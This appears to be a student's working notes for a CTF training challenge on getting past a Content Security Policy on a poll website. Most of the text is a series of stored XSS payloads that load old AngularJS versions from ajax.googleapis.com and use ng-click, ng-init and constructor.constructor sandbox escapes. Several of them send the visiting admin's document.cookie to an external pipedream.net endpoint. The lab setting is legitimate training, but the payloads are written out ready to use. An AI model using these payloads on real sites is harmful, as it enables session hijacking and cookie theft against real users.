string website = "https://csp.training.jinblack.it/";
string checker = "https://checker.training.ctf.necst.it/";
## CSP
default-src https://www.google.com https://ajax.googleapis.com 'unsafe-eval';
style-src 'self' https://maxcdn.bootstrapcdn.com/bootstrap/;
font-src 'self' https://maxcdn.bootstrapcdn.com/bootstrap/;
object-src 'none'

## WRITE UP
  - First : the index.html we have found states that no js is in use in this website, only plain html,
  - Second : I notice that css.css is empty and that its GET request returns a 404 ERR_ABORTED
  - Third : I notice that the html has a bootstrap.min.css from  https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css with crossorigin = anonymous

  Q: What exactly is crossorigin ? It is an HTML attribute which provides CORS support , defining how the element handles crossorigin requests, thereby enabling the
     configuration of CORS requests for the element's fetched data.
     The content of such an attribute is a CORS settings attribute, such attributes are enumerated
     :: anonymous || CORS requests for this element will have the credentials flag set to 'same-origin'

     This means that there will be NO EXCHANGE of USER CREDENTIALS via cookies, client-side SSL certificates or HTTP authentication, UNLESS it is IN THE SAME ORIGIN

I'm presented with an index.html where I can insert
  - Name
  - Location
  - Description
  - Options (this one could be interesting)

Later on another page is rendered with the previously inputted things  and the Site asks us to tick some options, input our name, and it also lets us make comments
https://csp.training.jinblack.it/poll/698e1d35bd4e408ab3e7d54bfbeedae6
I'm suspicious on what the numbers after poll/ are, probably some sort of session token or id for what I've inputted
In fact whenever I change it I'm brought to a 404..

If I click on the add I'm brought to
https://csp.training.jinblack.it/choose
and I'm given a 500 Internal Server Error

If I submit a comment I can either "Increase the universe's entropy" by posting a comment which gets a POST request to the poll or I could Close the form

## IDEA
First draft : publish something compromising on the comments and check what happens whenever the admin visits it
I think I could take advantage of maxcdn.bootstrapcdn , and see whether or not it hosts something I could exploit !
Please take notice that it is only available for style-src and font-src as such you CANNOT exploit to do anything useful

On the other hand https://ajax.googleapis.com is surely interesting, will it contain angularjs ?
I directly search for the url and I get redirected to https://developers.google.com/speed/libraries

I need to do a trick similiar to babycsp, as I think that I will not be able to do sh^t with the fetch instruction  
><script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.8.2/angular.min.js"></script><div ng-app ng-csp id=p ng-click=$event.view.alert(1337)>

The comment works , but please note that the admin is just going to visit the page, so we should get something that opens on page visit
"><script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.8.2/angular.min.js"></script><div ng-app ng-csp id=p ng-click=$window.open('https://ennwzvkmkf3a21o.m.pipedream.net'+document.cookie,'_blank')>

we now have to check the right directive ,which will be ng-init
"><script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.min.js"></script><div ng-app ng-init=$event.view.alert(1337)>


<div ng-app="" ng-init="constructor.constructor('$window.location.href = \'https://ennwzvkmkf3a21o.m.pipedream.net\' + document.cookie')()" class="ng-scope">AAAAA</div>
<script src="//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js"></script>

It seems that I'm not able to leverage google's ajax apis even when trying to do a simple visit, the only thing I can do is a

<script src="//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js"></script><div ng-app ng-csp id=p ng-init="constructor.constructor('window.location.href = \'https://ennwzvkmkf3a21o.m.pipedream.net\' + document.cookie')()" class="ng-scope">Testando</div>

This version of the exploit now results in an internal server error, something is up !

<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js"></script><div ng-app ng-csp id=p ng-init="alert(1337)" class="ng-scope">Testando</div>

This version doesn't give us anything because it violates the style src CSP , what happens if I remove the Text ?

<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js"></script><div ng-app ng-csp id=p ng-init="$window.view.alert(1337)" class="ng-scope">

I'll start from the beginning, seeing if I can send an on-click request to my endpoint !

><script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.8.2/angular.min.js"></script><div ng-app ng-csp id=p ng-click="constructor.constructor('$window.location.href = \'https://ennwzvkmkf3a21o.m.pipedream.net\' + document.cookie')()" class="ng-scope">

This still returns me the 500 Internal server error , something is really up! maybe it should be url encoded ?

><script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.8.2/angular.min.js"></script><div ng-app ng-csp id=p ng-click="constructor.constructor('window.location.href ='https://ennwzvkmkf3a21o.m.pipedream.net/' + document.cookie')()" class="ng-scope">

Still 500 Internal Server Error, so I want to go back at the basics and see whether or not is the constructor.constructor() or the window.location being the cause of the bug

><script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.8.2/angular.min.js"></script><div ng-app ng-csp id=p ng-click="constructor.constructor('alert(1338)')()" class="ng-scope">

Ok it WORKS !! What is the problem ? I guess there's something wrong with how the string is constructed, also, the AngularJS version we were running (1.8.2) patched the
sandbox escape exploit

><script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.1.5/angular.min.js"></script><div ng-app ng-csp id=p ng-click="constructor.constructor('$window.location.href=\'https://ennwzvkmkf3a21o.m.pipedream.net/cspISONLINE\' ')()" class="ng-scope">

With just window.location.href nothing happens while with $window we get the error that it is not defined...

<a id="this" onLoad="document.getElementById('this').click()" ng-app ng-csp ng-click="$event.view.window.location.href='https://ennwzvkmkf3a21o.m.pipedream.net/'%2bdocument.cookie" href="."><script src="//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js"></script>text</a>

<a id="this" onLoad="document.getElementById('this').click()" ng-app ng-csp ng-click="$event.view.alert(1335)"><script src="//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js" href="."></script>text</a>


<a id="payload" onload="document.getElementById('payload').click()" ng-app ng-csp ng-click="$event.view.alert(1337)" href="https://ennwzvkmkf3a21o.m.pipedream.net/'%2bdocument.cookie"><script src="//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js"></script>text</a>


<h2>PAYLOAD</h2><a id="payload" ng-init="document.getElementById('payload').click();$event.view.alert('MACUMUFICIFARI')" ng-app ng-csp ng-click="$event.view.alert('FU')" ><script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js"></script>text</a>

<h2>Payload</h2><script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js"></script>
  <div ng-app="ciao" data-ng-init="$scope.onloadFun=alert(111)">
  </div>

  <h2>Payload</h2><a id="idk" onload="$window.view.alert(12)" ng-app ng-csp><script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js"></script>pocoserio</a>






<iframe src="about:blank" width="300" height="250" scrolling="no" frameborder="0" marginwidth="0" marginheight="0" onLoad="document.getElementById('payload').click()">

</iframe>
<a id="this" onLoad="document.getElementById('this').click()" ng-app ng-csp ng-click="$event.view.window.location.href='https://ennwzvkmkf3a21o.m.pipedream.net/'%2bdocument.cookie" href="."><script src="//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js"></script>text</a>
